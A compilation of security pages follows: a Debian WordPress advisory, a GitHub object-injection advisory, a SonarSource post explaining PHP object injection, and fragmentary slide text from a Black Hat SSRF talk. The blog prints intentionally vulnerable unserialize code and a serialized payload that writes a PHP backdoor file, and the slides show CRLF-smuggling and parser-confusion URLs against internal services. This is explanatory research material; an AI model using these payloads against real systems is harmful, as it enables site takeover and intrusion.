=== Content from lists.debian.org_947282c6_20250108_124124.html ===


---

[[Date Prev](msg00018.html)][[Date Next](msg00020.html)]
[[Thread Prev](msg00018.html)][[Thread Next](msg00020.html)]
[[Date Index](maillist.html#00019)]
[[Thread Index](threads.html#00019)]

# [SECURITY] [DLA 2884-1] wordpress security update

---

* *To*: debian-lts-announce@lists.debian.org
* *Subject*: [SECURITY] [DLA 2884-1] wordpress security update
* *From*: Utkarsh Gupta <utkarsh@debian.org>
* *Date*: Mon, 24 Jan 2022 00:39:19 +0530
* *Message-id*: <[[🔎]](/msgid-search/CAPP0f97V1NXUSz3tLkNDQipy9-9JHyYkDPq6Pe0bX_3Qk9_qBw%40mail.gmail.com) [CAPP0f97V1NXUSz3tLkNDQipy9-9JHyYkDPq6Pe0bX\_3Qk9\_qBw@mail.gmail.com](msg00019.html)>
* *Mail-followup-to*: debian-lts@lists.debian.org
* *Reply-to*: debian-lts@lists.debian.org

---

```
-----BEGIN PGP SIGNED MESSAGE-----
Hash: SHA256

- -------------------------------------------------------------------------
Debian LTS Advisory DLA-2884-1                debian-lts@lists.debian.org
<https://www.debian.org/lts/security/>                        Utkarsh Gupta
January 17, 2022                              <https://wiki.debian.org/LTS>
- -------------------------------------------------------------------------

Package        : wordpress
Version        : 4.7.22+dfsg-0+deb9u1
CVE ID         : CVE-2022-21661 CVE-2022-21662 CVE-2022-21663
                 CVE-2022-21664
Debian Bug     : 1003243

Several vulnerabilities were discovered in Wordpress, a web blogging
tool. They allowed remote attackers to perform SQL injection, run
unchecked SQL queries, bypass hardening, or perform Cross-Site
Scripting (XSS) attacks.

For Debian 9 stretch, these problems have been fixed in version
4.7.22+dfsg-0+deb9u1.

We recommend that you upgrade your wordpress packages.

For the detailed security status of wordpress please refer to
its security tracker page at:
<https://security-tracker.debian.org/tracker/wordpress>

Further information about Debian LTS security advisories, how to apply
these updates to your system and frequently asked questions can be
found at: <https://wiki.debian.org/LTS>
-----BEGIN PGP SIGNATURE-----

iQIzBAEBCAAdFiEEbJ0QSEqa5Mw4X3xxgj6WdgbDS5YFAmHtp1oACgkQgj6WdgbD
S5Zz2RAAlCfJ4xyFEaccC2HtcKYv0dtBTRKEGe2eqViQUjoMrvbJ+OQInE62T4fN
1A1+mvGOk2OIM6QPjIJbWFEkIxbzCLObypfhsIr4uagZmHvb+4M7n75RyRMPZ5SW
P/EOkH8nEM8YvtrdWLYKB+/daG2hICZAS9lxehm0obzm20XL3eDxuLVdb2UM6Kdu
J9q7/wO/dlHe5Qq0pPYU6401n/mnMYVM2W8KD8Z7FnHwBwpWJh1L8bX+ks4g1As5
28RHw0yqyMaphmwUh7wg/md4SUongQ2pgusCgjEoygkI8GLIqVlJTw8PxcVCDw05
ttAg6LDHdWG/KXc+UMSHV7cThhK9MST1MYtmbyYKUnYKLqoMVkdewnJ+3tR8trYL
EUfAGSb2P/5EDMJ7n5luRLaUhKqWvC/COISJe7GC5c0arQm/ZHuF/qVYRylIUE9y
wXdf5L5rDlQr3xfjRDuOxUv5EKUgwmFY8BH6duVXs9KZReeaI2wqna0BVd/I5qqo
nEgAAfom4MEjz7Qh1srKwOympX8KoEweCzwtza/1Zmbq5PjYFq4XT2g3tkXH3aQJ
ohVlP8FjSuHMs+liyNu/ybQ+jh7C7ufa1Mnh9pWfWV5f8HKU6G8yooJpAkU6chUg
Q+geCJIMszlzkA1akDr/R6Eeo/6VCI5fKrZdxc6mwfhQEWnNybo=
=QEF9
-----END PGP SIGNATURE-----

```

---



=== Content from github.com_9a732c8b_20250108_124123.html ===

[Skip to content](#start-of-content)

## Navigation Menu

Toggle navigation

[Sign in](/login?return_to=https%3A%2F%2Fgithub.com%2FWordPress%2Fwordpress-develop%2Fsecurity%2Fadvisories%2FGHSA-jmmq-m8p8-332h)

* Product

  + [GitHub Copilot
    Write better code with AI](https://github.com/features/copilot)
  + [Security
    Find and fix vulnerabilities](https://github.com/features/security)
  + [Actions
    Automate any workflow](https://github.com/features/actions)
  + [Codespaces
    Instant dev environments](https://github.com/features/codespaces)
  + [Issues
    Plan and track work](https://github.com/features/issues)
  + [Code Review
    Manage code changes](https://github.com/features/code-review)
  + [Discussions
    Collaborate outside of code](https://github.com/features/discussions)
  + [Code Search
    Find more, search less](https://github.com/features/code-search)

  Explore
  + [All features](https://github.com/features)
  + [Documentation](https://docs.github.com)
  + [GitHub Skills](https://skills.github.com)
  + [Blog](https://github.blog)
* Solutions

  By company size
  + [Enterprises](https://github.com/enterprise)
  + [Small and medium teams](https://github.com/team)
  + [Startups](https://github.com/enterprise/startups)
  By use case
  + [DevSecOps](/solutions/use-case/devsecops)
  + [DevOps](/solutions/use-case/devops)
  + [CI/CD](/solutions/use-case/ci-cd)
  + [View all use cases](/solutions/use-case)

  By industry
  + [Healthcare](/solutions/industry/healthcare)
  + [Financial services](/solutions/industry/financial-services)
  + [Manufacturing](/solutions/industry/manufacturing)
  + [Government](/solutions/industry/government)
  + [View all industries](/solutions/industry)

  [View all solutions](/solutions)
* Resources

  Topics
  + [AI](/resources/articles/ai)
  + [DevOps](/resources/articles/devops)
  + [Security](/resources/articles/security)
  + [Software Development](/resources/articles/software-development)
  + [View all](/resources/articles)

  Explore
  + [Learning Pathways](https://resources.github.com/learn/pathways)
  + [White papers, Ebooks, Webinars](https://resources.github.com)
  + [Customer Stories](https://github.com/customer-stories)
  + [Partners](https://partner.github.com)
  + [Executive Insights](https://github.com/solutions/executive-insights)
* Open Source

  + [GitHub Sponsors
    Fund open source developers](/sponsors)
  + [The ReadME Project
    GitHub community articles](https://github.com/readme)
  Repositories
  + [Topics](https://github.com/topics)
  + [Trending](https://github.com/trending)
  + [Collections](https://github.com/collections)
* Enterprise

  + [Enterprise platform
    AI-powered developer platform](/enterprise)
  Available add-ons
  + [Advanced Security
    Enterprise-grade security features](https://github.com/enterprise/advanced-security)
  + [GitHub Copilot
    Enterprise-grade AI features](/features/copilot#enterprise)
  + [Premium Support
    Enterprise-grade 24/7 support](/premium-support)
* [Pricing](https://github.com/pricing)

Search or jump to...

# Search code, repositories, users, issues, pull requests...

Search

Clear

[Search syntax tips](https://docs.github.com/search-github/github-code-search/understanding-github-code-search-syntax)

# Provide feedback

We read every piece of feedback, and take your input very seriously.

Include my email address so I can be contacted

  Cancel

 Submit feedback

# Saved searches

## Use saved searches to filter your results more quickly

Name

Query

To see all available qualifiers, see our [documentation](https://docs.github.com/search-github/github-code-search/understanding-github-code-search-syntax).

  Cancel

 Create saved search

[Sign in](/login?return_to=https%3A%2F%2Fgithub.com%2FWordPress%2Fwordpress-develop%2Fsecurity%2Fadvisories%2FGHSA-jmmq-m8p8-332h)

[Sign up](/signup?ref_cta=Sign+up&ref_loc=header+logged+out&ref_page=%2F%3Cuser-name%3E%2F%3Crepo-name%3E%2Frepos%2Fadvisories%2Fshow&source=header-repo&source_repo=WordPress%2Fwordpress-develop)
Reseting focus

You signed in with another tab or window. Reload to refresh your session.
You signed out in another tab or window. Reload to refresh your session.
You switched accounts on another tab or window. Reload to refresh your session.

Dismiss alert

{{ message }}

[WordPress](/WordPress)
/
**[wordpress-develop](/WordPress/wordpress-develop)**
Public mirror

mirrored from git://develop.git.wordpress.org/

* [Notifications](/login?return_to=%2FWordPress%2Fwordpress-develop) You must be signed in to change notification settings
* [Fork
  2.7k](/login?return_to=%2FWordPress%2Fwordpress-develop)
* [Star
   2.6k](/login?return_to=%2FWordPress%2Fwordpress-develop)

* [Code](/WordPress/wordpress-develop)
* [Pull requests
  1.9k](/WordPress/wordpress-develop/pulls)
* [Actions](/WordPress/wordpress-develop/actions)
* [Security](/WordPress/wordpress-develop/security)
* [Insights](/WordPress/wordpress-develop/pulse)

Additional navigation options

* [Code](/WordPress/wordpress-develop)
* [Pull requests](/WordPress/wordpress-develop/pulls)
* [Actions](/WordPress/wordpress-develop/actions)
* [Security](/WordPress/wordpress-develop/security)
* [Insights](/WordPress/wordpress-develop/pulse)

# WordPress: Authenticated Object Injection in Multisites

Low

[ehti](/ehti)
published
GHSA-jmmq-m8p8-332h
Jan 6, 2022

## Package

No package listed

## Affected versions

< 5.8.3

## Patched versions

5.8.3

## Description

### Impact

On a multisite, users with Super Admin role can bypass explicit/additional hardening under certain conditions through object injection.

### Patches

This has been patched in WordPress version 5.8.3. Older affected versions are also fixed via security release, that go back till 3.7.37. We strongly recommend that you keep auto-updates enabled.

### References

<https://wordpress.org/news/category/releases/>

<https://hackerone.com/reports/541469>

### For more information

If you have any questions or comments about this advisory:

* Open an issue in [HackerOne](https://hackerone.com/wordpress)

### Severity

Low

### CVE ID

CVE-2022-21663

### Weaknesses

No CWEs

## Footer

© 2025 GitHub, Inc.

### Footer navigation

* [Terms](https://docs.github.com/site-policy/github-terms/github-terms-of-service)
* [Privacy](https://docs.github.com/site-policy/privacy-policies/github-privacy-statement)
* [Security](https://github.com/security)
* [Status](https://www.githubstatus.com/)
* [Docs](https://docs.github.com/)
* [Contact](https://support.github.com?tags=dotcom-footer)
* Manage cookies
* Do not share my personal information

You can’t perform that action at this time.



=== Content from blog.sonarsource.com_3cffd7a4_20250108_153634.html ===
NEW![Sonar has entered a definitive agreement to acquire Tidelift! Read the press release.](/company/press-releases/sonar-to-acquire-tidelift/) [![](data:image/svg+xml;charset=utf-8...)![sonar logo ](https://assets-eu-01.kc-usercontent.com:443/95361965-6528-012b-61fc-b49456de9702/8e59bcad-6e39-41dc-abd9-a0e251e8d63f/Sonar%20%282%29.svg?w=128&h=32&auto=format&fit=clip)![sonar logo ](https://assets-eu-01.kc-usercontent.com:443/95361965-6528-012b-61fc-b49456de9702/8e59bcad-6e39-41dc-abd9-a0e251e8d63f/Sonar%20%282%29.svg?w=128&h=32&auto=format&fit=clip)](/ "Home")

* Solutions

  Use Cases

  [AI-assisted & quality-assured codeEnsure code generated by AI assistants is of the highest quality](/solutions/ai/)[DevOps transformationHarness the full potential of DevOps by reducing roll backs and improving quality of releases](/solutions/devops-transformation/)[Code coverageEnsure code quality and security by facilitating faster debugging through clear visibility of coverage gaps.](/solutions/code-coverage/) [Reduce & manage technical debtMaximize innovation by proactively managing technical debt](/solutions/reduce-technical-debt/)[Secure by designIntegrate code security in compliance with NIST Secure Software Development Framework](/solutions/secure-by-design-code/)[All Use CasesRead more about Sonar Use cases with blog articles, technical articles and developer guides](/solutions/use-cases/)

  Clean Code

  [What is clean codeA detailed definition of Clean Code](/solutions/clean-code/)[Power of clean codeBusiness success built on Clean Code](/solutions/power-of-clean-code/)[Security starts with Clean CodeStatic Application Security Testing with Sonar](/solutions/security/)[Clean as You CodeOur unique approach to Clean Code](/solutions/our-unique-approach/)

  Something For Everyone

  [For DevelopersFind and fix issues as you code](/solutions/for-developers/)[For DevOpsBuild your apps on Clean Code foundations](/solutions/infrastructure-as-code/)[For EnterpriseClean Code delivery from development to production](/solutions/for-enterprise/)[For the Public SectorClean Code for the public sector](/solutions/public-sector/)
* Products

  Industry Leading Products

  [![]()![](https://assets-eu-01.kc-usercontent.com:443/95361965-6528-012b-61fc-b49456de9702/aa3b1f02-f1b0-448f-a3f2-a1bd32923a08/SQ_Logo_Cloud_Light%20Backgrounds.svg?w=176&h=48&auto=format&fit=crop)Formerly SonarCloudCloud-based static analysis tool for your CI/CD workflows](/products/sonarcloud/)[![]()![](https://assets-eu-01.kc-usercontent.com:443/95361965-6528-012b-61fc-b49456de9702/bdac1871-464e-4051-88db-7df20c3bfffa/SQ_Logo_Server_Light%20Backgrounds.svg?w=176&h=48&auto=format&fit=crop)Formerly SonarQubeSelf-managed static analysis tool for continuous codebase inspection](/products/sonarqube/)[![]()![](https://assets-eu-01.kc-usercontent.com:443/95361965-6528-012b-61fc-b49456de9702/49f23af2-a29b-4d0f-95d7-ffd361f375e1/SQ_Logo_IDE_Light%20Backgrounds.svg?w=176&h=48&auto=format&fit=crop)Formerly SonarLintFree IDE extension that provides on-the-fly analysis and coding guidance](/products/sonarlint/)

  Languages and Frameworks

  [Java](/knowledge/languages/java/)[JavaScript](/knowledge/languages/js/)[TypeScript](/knowledge/languages/ts/)[Python](/knowledge/languages/python/)[C#](/knowledge/languages/csharp/)[C++](/knowledge/languages/cpp/)[C](/knowledge/languages/c/)[PHP](/knowledge/languages/php/)[Kotlin](/knowledge/languages/kotlin/)[See All](/lp/knowledge/languages/)
* Resources

  Learn About Clean Code

  [BlogStay connected with our latest development news and articles](/blog/)[Events hubLet's meet up online or in person - browse our conferences and webinars, or watch previous talks](/resources/events/)[Customer StoriesCheck out Sonar implementation success stories](/resources/customer-stories/)[White PapersFind in-depth articles on clean code](/resources/white-papers/)[LearnDeveloper learning hub - covering essential topics](/learn/)[Solution BriefsOur library of solution briefs](/resources/solution-briefs/)

  Go In Depth

  [SonarQube Server DocumentationFind more information on the technical details of SonarQube Server](https://docs.sonarsource.com/sonarqube/latest/)[SonarQube Cloud DocumentationFind more information on the technical details of SonarQube Cloud](https://docs.sonarsource.com/sonarcloud/)[SonarQube for IDE DocumentationFind more information on the technical details of SonarQube IDE](https://docs.sonarsource.com/sonarlint/)[Explore SonarpediaExplore our publicly available multi-language rules database](https://rules.sonarsource.com/)[LanguagesSee our multi-language coverage](/knowledge/languages/)
* Company

  Deliver Better Software

  [About UsSonar’s industry leading solution enables developers to write clean code and remediate existing code organically](/company/about/)[CareersJoin our growing team](/company/careers/)[Commitment to open sourceOur commitment to transparency, security, and continuous improvement](/solutions/commitment-to-open-source/)[CommunityGet latest updates, suggest features, and share your knowledge](https://community.sonarsource.com/)[PartnersSonar partners with the best resellers to bring Clean Code closer to you](/company/partners/)[Contact usHave questions? Get in touch](/company/contact/)

  Media

  [NewsroomNews announcements, media coverage, and more](/company/newsroom/)[CoverageFind articles about Sonar in the news](/company/coverage/)[Press ReleasesThe latest Sonar updates](/company/press-releases/)[CustomersAn overview of customers using Sonar by industry](/company/customers/)[Press KitExecutive headshots, quick stats, customer logos, and more](/company/press-kit/)
[Start for free](/open-source-editions/)[Explore pricing](/plans-and-pricing/)
Search modal toggle button[Start for free](/open-source-editions/)[Explore pricing](/plans-and-pricing/)Mobile menu toggle button

Blog post

# PHP Object Injection

![](data:image/svg+xml;charset=utf-8...)![Simon Scannell photo]()![Simon Scannell photo](https://assets-eu-01.kc-usercontent.com:443/95361965-6528-012b-61fc-b49456de9702/39a5ba27-50e6-46a9-915d-4c21a2205308/05747622-11af-457d-a883-8ad3b3fb7aaf_simon.jpg?w=1080&h=1080&auto=format&fit=crop)

Simon Scannell

Vulnerability Researcher

October 9, 2018

Date

* [Security](/blog/tag/security/)
![](data:image/svg+xml;charset=utf-8...)![A very common and critical vulnerability in PHP applications is PHP Object Injection. This blog post explains how they work and how they can lead to a full site takeover by remote attackers.](https://assets-eu-01.kc-usercontent.com:443/95361965-6528-012b-61fc-b49456de9702/c5cdcf61-b15e-4489-b704-6c39f58cb0f5/cover-fd7ed5ab-d270-45e6-8e9d-8ae50c9d7b59_drupal-pop-chain.png?w=715&h=426&auto=format&fit=crop)![A very common and critical vulnerability in PHP applications is PHP Object Injection. This blog post explains how they work and how they can lead to a full site takeover by remote attackers.](https://assets-eu-01.kc-usercontent.com:443/95361965-6528-012b-61fc-b49456de9702/c5cdcf61-b15e-4489-b704-6c39f58cb0f5/cover-fd7ed5ab-d270-45e6-8e9d-8ae50c9d7b59_drupal-pop-chain.png?w=715&h=426&auto=format&fit=crop)

A very common and critical vulnerability in PHP applications is PHP Object Injection. This blog post explains how they work and how they can lead to a full site takeover by remote attackers.

## PHP Serialization Recap

PHP provides a mechanism for storing and loading data with PHP types across multiple HTTP requests. This mechanism boils down to two functions: serialize() and unserialize(). This may sound complicated but let’s look at the following easy example:

**A PHP object is** ***serialized***

```
<?php
$object = new stdClass();
$object->data = "Some data!";
$cached = serialize($object);

The above example creates a new object and the
```

The above example creates a new object and then produces the following *serialized* string representation of this object:

**The resulting** ***serialized*** **string:**

```
O:8:"stdClass":1:{s:4:"data";s:10:"Some data!";}
```

The syntax of the serialized string is relatively easy to understand: The `O` stands for the type of the serialized string. In this case the `O` maps to a PHP `object`. The `8` separated by the colons represents the length of the name of the class the object is an instance of. In this case, the serialized object is an instance of the PHP built in `stdClass`.

The following `1` represents the number of properties the serialized object contains which are stored within curly brackets. Each property is stored as a serialized string representing the property name, a semicolon and a serialized string representing the value.

While the property name is always a serialized PHP `string`, the value can be of any type: `arrays`, `integers`, `strings`, `objects` and `NULL` are the most common ones. In this example, there is only one property. It has the name `data` and has the value `Some data!`, which is a PHP `string` (s) of length 10.

## PHP Deserialization

The reason I touched on PHP serialization syntax is to make it easier to understand what happens when you call `unserialize()` on a serialized string.

**The** ***serialized*** **string is** ***unserialized*** **again:**

```
<?php
$object = unserialize('O:8:"stdClass":1:{s:4:"data";s:10:"Some data!";}');
echo $object->data;
```

PHP will parse the serialized string with the logic depicted above and create an instance of an `stdClass` with the properties given in the serialized string.

The reason developers do this is to easily and effectively store PHP data across requests, e.g. in caches or databases. A user session might be implemented as an instance of a class `UserSession`. This session object can easily be stored as a serialized string in the`$_SESSION` superglobal of PHP and be unserialized when needed.

## Dangers of Unserialize

Although this feature is very effective and easy to use, it does introduce potential security issues, to be exact when user input is passed to unserialize(). This can in fact lead to Remote Code Execution. For one, the PHP interpreter had many [low-level security issues](https://blog.ripstech.com/2017/security-flaws-in-the-php-core/ "low-level security issues") in this built-in function that could be exploited. But also, depending on the code base of the affected application, there are other ways for attackers. Let’s have a look at the following PHP code:

```
<?php
class LoggingClass {
    function __construct($filename, $content) {
        // add .log to the filename so we are really creating a log file!!
        $this->filename = $filename . ".log";
        $this->content = $content;
    }

    // This method is executed for each object at the end of the PHP execution
    function __destruct() {
        // flush the logs
        file_put_contents($this->filename, $this->content);
    }
}

$data = unserialize($_GET['data']);
```

Here, user input is directly passed to `unserialize()`. The next section will detail how this can be exploited.

### Magic Methods and Object Injections

The `LoggingClass` declared in the example above takes two parameters in the constructor: A filename to write to and the file contents. The magic method `__destruct()` then actually flushes the log and writes it to the filename passed to the constructor. Note that the `__destruct()` method is called **automatically** for each PHP object of the `LoggingClass` at the end of the PHP code execution.

Even if an attacker would be able to control the arguments passed to the constructor, he probably would not be able to exploit the vulnerability for the simple reason that a `.log` is appended to the filename. If this would not happen, the attacker could simply set the filename to `shell.php` and set the content to some arbitrary PHP code.

However, if an attacker supplied the following serialized string to the call to `unserialize()`, he could still exploit the vulnerability with the following serialized payload:

```
O:12:"LoggingClass":2:{s:8:"filename";s:9:"shell.php";s:7:"content";s:20:"<?php evilCode(); ?>";}
```

Here, the filename property is set to `shell.php`. The constructor of the class is *not* called during deserialization, the object was already instantiated and is available in serialized form. However, the destructor is going to be called at the end of execution and it’s using the object’s properties. Namely, the destructor will call `file_put_contents()` on the filename and content property that can be edited by the attacker by modifying the serialized string. This allows an attacker to inject an object into memory with the `filename` property set to `shell.php` which will then create a PHP backdoor on the server.

There are also further ways for exploitation. For example, the altered properties could be used to call another method of an object. An attacker could then control the class of that method call and defer the control flow. Such payloads are called *property oriented programming* and we documented examples for [Drupal](https://blog.ripstech.com/2019/complex-drupal-pop-chain/ "Drupal") and [ExpressionEngine](https://blog.ripstech.com/2016/expressionengine-code-reuse-attack/ "ExpressionEngine").

### Object Injections in Real World

Although passing user input to unserialize() is highly discouraged, such attacks still happen all the time. To name a few examples, we detected the following critical PHP Object Injections:

* [Pydio unauthenticated Remote Code Execution](https://blog.sonarsource.com/php-object-injection/ "Pydio unauthenticated Remote Code Execution")
* [WooCommerce Privilege Escalation](https://blog.sonarsource.com/php-object-injection/ "WooCommerce Privilege Escalation")
* [PrestaShop Remote Code Execution](https://blog.sonarsource.com/php-object-injection/ "PrestaShop Remote Code Execution")

### Related Posts

* [Pydio 8.2.1 Unauthenticated Remote Code Execution](https://blog.sonarsource.com/php-object-injection/ "Pydio 8.2.1 Unauthenticated Remote Code Execution")
* [Shopware 5.3.3: PHP Object Instantiation to Blind XXE](https://blog.sonarsource.com/php-object-injection/ "Shopware 5.3.3: PHP Object Instantiation to Blind XXE")
* [A Salesmans Code Execution: PrestaShop 1.7.2.4](https://blog.sonarsource.com/php-object-injection/ "A Salesmans Code Execution: PrestaShop 1.7.2.4")
* [CTF Writeup: Complex Drupal POP Chain](https://blog.sonarsource.com/php-object-injection/ "CTF Writeup: Complex Drupal POP Chain")
* [Breaking Into Your Company's Internal Network - SuiteCRM 7.11.4](https://blog.sonarsource.com/php-object-injection/ "Breaking Into Your Company's Internal Network - SuiteCRM 7.11.4")
* [phpBB 3.2.3: Phar Deserialization to RCE](https://blog.sonarsource.com/php-object-injection/ "phpBB 3.2.3: Phar Deserialization to RCE")
* [What is Phar Deserialization](https://blog.sonarsource.com/php-object-injection/ "What is Phar Deserialization")
* [How security flaws in PHP's core can affect your application](https://blog.sonarsource.com/php-object-injection/ "How security flaws in PHP's core can affect your application")
* [Why mail() is dangerous in PHP](https://blog.sonarsource.com/php-object-injection/ "Why mail() is dangerous in PHP")
#### SHARE

[twitter](https://twitter.com/share?text=undefined)[facebook](https://www.facebook.com/sharer/sharer.php?u=undefined)[linkedin](https://www.linkedin.com/sharing/share-offsite/?url=undefined)mail[Go to SonarSource homepage![](data:image/svg+xml;charset=utf-8...)![sonar logo ]()![sonar logo ](https://assets-eu-01.kc-usercontent.com:443/95361965-6528-012b-61fc-b49456de9702/8e59bcad-6e39-41dc-abd9-a0e251e8d63f/Sonar%20%282%29.svg?w=160&h=40&auto=format&fit=crop)](/)

* **Sonar Solutions**
  + [SAST](/solutions/security/)
  + [What is clean code](/solutions/clean-code/)
  + [Power of clean code](/solutions/power-of-clean-code/)
  + [Clean as you code](/solutions/our-unique-approach/)
  + [AI-assisted & quality-assured code](/solutions/ai/)
  + [DevOps transformation](/solutions/devops-transformation/)
  + [Outsourcing software development](/solutions/reduce-outsourcing-software-development-risk/)
  + [Reduce & manage technical debt](/solutions/reduce-technical-debt/)
  + [Secure by design](/solutions/secure-by-design-code/)
  + [Code coverage](/solutions/code-coverage/)
  + [Code review](/solutions/code-review/)
  + [For developers](/solutions/for-developers/)
  + [For enterprise](/solutions/for-enterprise/)
  + [Infrastructure as code](/solutions/infrastructure-as-code/)
  + [Public sector](/solutions/public-sector/)
* **Products**
  + [SonarQube for IDE](/products/sonarlint/)
  + [SonarQube Server](/products/sonarqube/)
  + [SonarQube Cloud](/products/sonarcloud/)**Pricing**
  + [Start for free](/open-source-editions/)
  + [Explore pricing](/plans-and-pricing/)
* **Company**
  + [About](/company/about/)
  + [Careers](/company/careers/)
  + [Commitment to open source](/solutions/commitment-to-open-source/)
  + [Customers](/company/customers/)
  + [Partners](/company/partners/)
  + [Contact us](/company/contact/)
  + [Accessibility](/accessibility/)
  + [NEW! Brand identity](/brand-identity/)**Media**
  + [Coverage](/company/coverage/)
  + [Press releases](/company/press-releases/)
* **Resources**
  + [Events hub](/resources/events/)
  + [Customer stories](/resources/customer-stories/)
  + [White papers](/resources/white-papers/)
  + [Learn](/learn/guide/)
  + [Community](https://community.sonarsource.com/)
  + [Support](/support/)
* **Knowledge**
  + [Explore Sonarpedia](https://rules.sonarsource.com/)
  + [Blog](/blog/)
  + [Languages](/knowledge/languages/)
  + [SonarQube Server Documentation](https://docs.sonarsource.com/sonarqube/latest/)
  + [SonarQube Cloud Documentation](https://docs.sonarsource.com/sonarcloud/)
  + [SonarQube for IDE Documentation](https://docs.sonarsource.com/sonarlint/)

* [Legal documentation](/legal/)
* [Trust center](/trust-center/)

* [Follow SonarSource on Twitter](https://twitter.com/sonarsource)
* [Follow SonarSource on Linkedin](https://www.linkedin.com/company/sonarsource/)

© 2008-2025 SonarSource SA. All rights reserved. SONAR, SONARSOURCE, SONARQUBE, and CLEAN AS YOU CODE are trademarks of SonarSource SA.



=== Content from www.blackhat.com_27787cf0_20250108_153633.html ===
A New Era of SSRF - Exploiting URL Parser in
Trending Programming Languages!

Orange Tsai

About Orange Tsai

Taiwan No.1

About Orange Tsai

The most professional red team in Taiwan

About Orange Tsai

The largest hacker conference in Taiwan
founded by chrO.ot

About Orange Tsai

Speaker - Speaker at several security conferences

HITCON, WooYun, AVTokyo

CTFer - CTFs we won champions  / in finalists (as team HITCON)

DEFCON, Codegate, Boston Key Party, HITB, Seccon, 0CTF, WCTF

Bounty Hunter - Vendors I have found Remote Code Execution

Facebook, GitHub, Uber, Apple, Yahoo, Imgur

Agenda

Introduction

Make SSRF great again

Issues that lead to SSRF-Bypass

Issues that lead to protocol smuggling

Case studies and Demos

Mitigations

What is SSRF?

Server Side Request Forgery

Bypass Firewall, Touch Intranet

Compromise Internal services

Struts2

Redis

Elastic

Protocol Smuggling in SSRF

Make SSRF more powerful

Protocols that are suitable to smuggle

HTTP based protocol

Elastic, CouchDB, Mongodb, Docker

Text-based protocol

FTP, SMTP, Redis, Memcached

Quick Fun Example

http://1.1.1.1 &@2.2.2.2# @3.3.3.3/

Quick Fun Example

urllib

http://1.1.1.1 &@2.2.2.2# @3.3.3.3/

urllib2
httplib

requests

Python is so Hard

Quick Fun Example

CR-LF Injection on HTTP protocol

Smuggling SMTP protocol over HTTP protocol

http://127.0.0.1:25/%0D%0AHELO orange.tw%0D%0AMAIL FROM…

>> GET /
<< 421 4.7.0 ubuntu Rejecting open proxy localhost [127.0.0.1]
>> HELO orange.tw

Connection closed

SMTP Hates HTTP Protocol

It Seems Unexploitable

Gopher Is Good

What If There Is No Gopher Support?

HTTPS

What Won't Be Encrypted in a SSL Handshake?

Quick Fun Example

CR-LF Injection on HTTPS protocol

Exploit the Unexploitable - Smuggling SMTP over TLS SNI

https://127.0.0.1□%0D%0AHELO□orange.tw%0D%0AMAIL□FROM…:25/

$ tcpdump -i lo -qw - tcp port 25 | xxd

000001b0: 009c 0035 002f c030 c02c 003d 006a 0038  ...5./.0.,.=.j.8
000001c0: 0032 00ff 0100 0092 0000 0030 002e 0000  .2.........0....
000001d0: 2b31 3237 2e30  2e30 2e31  200d 0a48 454c  +127.0.0.1 ..HEL
000001e0: 4f20 6f72 616e 6765 2e74 770d 0a4d 4149  O orange. tw..MAI
000001f0: 4c20 4652 4f4d 2e2e 2e0d 0a11 000b 0004  L FROM..........
00000200: 0300 0102 000a 001c 001a 0017 0019 001c  ................

Quick Fun Example

CR-LF Injection on HTTPS protocol

Exploit the Unexploitable - Smuggling SMTP over TLS SNI

https://127.0.0.1□%0D%0AHELO□orange.tw%0D%0AMAIL□FROM…:25/

$ tcpdump -i lo -qw - tcp port 25 | xxd

000001b0: 009c 0035 002f c030 c02c 003d 006a 0038  ...5./.0.,.=.j.8
000001c0: 0032 00ff 0100 0092 0000 0030 002e 0000  .2.........0....
000001d0: 2b31 3237 2e30  2e30 2e31 20 0d 0a 48 454c  +127.0.0.1  ..HEL
000001e0: 4f20 6f72 616e 6765 2e74 77 0d 0a 4d 4149  O orange. tw..MAI
000001f0: 4c20 4652 4f4d 2e2e 2e0d 0a11 000b 0004  L FROM..........
00000200: 0300 0102 000a 001c 001a 0017 0019 001c  ................

Quick Fun Example

CR-LF Injection on HTTPS protocol

Exploit the Unexploitable - Smuggling SMTP over TLS SNI

https://127.0.0.1□%0D%0AHELO orange.tw%0D%0AMAIL FROM…:25/

$ tcpdump -i lo -qw - tcp port 25 | xxd

000001b0: 009c 0035 002f c030 c02c 003d 006a 0038  ...5./.0.,.=.j.8
000001c0: 0032 00ff 0100 0092 0000 0030 002e 0000  .2.........0....
+127.0.0.1  ..HEL
000001d0: 2b31 3237 2e30  2e30 2e31 20 0d 0a 48 454c
000001e0:  4f20 6f72 616e 6765 2e74 77 0d 0a 4d 4149
O orange. tw..MAI
000001f0:  4c20 4652 4f4d 2e2e 2e0d 0a11 000b 0004   L FROM ..........
00000200: 0300 0102 000a 001c 001a 0017 0019 001c  ................

Quick Fun Example

CR-LF Injection on HTTPS protocol

Exploit the Unexploitable - Smuggling SMTP over TLS SNI

https://127.0.0.1□%0D%0AHELO orange.tw%0D%0AMAIL FROM…:25/

$ tcpdump -i lo -qw - tcp port 25

>> ...5./.0.,.=.j.8.2......... 0... +127.0.0.1
<< 500  5.5.1  Command  unrecognized:  ... 5./. 0.,.=.j.8.2..0.+127.0.0.1
>> HELO  orange.tw
<< 250  ubuntu Hello  localhost  [127.0.0.1],  please  meet  you
>> MAIL  FROM:  <admin@orange.tw>
<< 250  2.1.0  <admin@orange.tw>...  Sender  ok

Make SSRF Great Again

URL Parsing Issues

It's all about the inconsistency between URL parser and requester

Why validating a URL is hard?

1.

Specification in RFC2396, RFC3986 but just SPEC

2. WHATWG defined a contemporary implementation based on RFC but

different languages still have their own implementations

URL Components(RFC 3986)

authority

query

foo://example.com:8042/over/there?name=bar#nose

scheme

path

fragment

URL Components(RFC 3986)

(It's  complicated)
authority

(I don't care)
query

foo://example.com:8042/over/there?name=bar#nose

scheme
(We  only  care  about
HTTP  HTTPS)

path
(It's  complicated)

fragment
(I  don't  care)

Big Picture

Libraries/Vulns

Python httplib

Python   urllib

Python   urllib2

Ruby   Net::HTTP

Java   net.URL

Perl   LWP

NodeJS   http

PHP   http_wrapper

Wget

cURL

CR-LF Injection

URL  Parsing

Path

Host

SNI

Port Injection Host Injection Path  Injection

💀

💀

💀

💀

💀

💀

💀

💀

💀

💀

💀

💀

💀

💀

💀

💀

💀

💀

💀

💀

💀

💀

💀

Abusing URL Parsers

Consider the following PHP code

$url = 'http://' . $_GET[url];
$parsed = parse_url($url);
if ( $parsed[port] == 80 && $parsed[host] == 'google.com') {

readfile($url);

} else {

die('You Shall Not Pass');

}

Abusing URL Parsers

http://127.0.0.1:11211:80/

Abusing URL Parsers

PHP parse_url
Perl URI

http://127.0.0.1:11211:80/

PHP readfile
Perl LWP

Abusing URL Parsers

RFC3986

authority     =
port          =
host          =
reg-name      =
unreserved    =
=
sub-delims

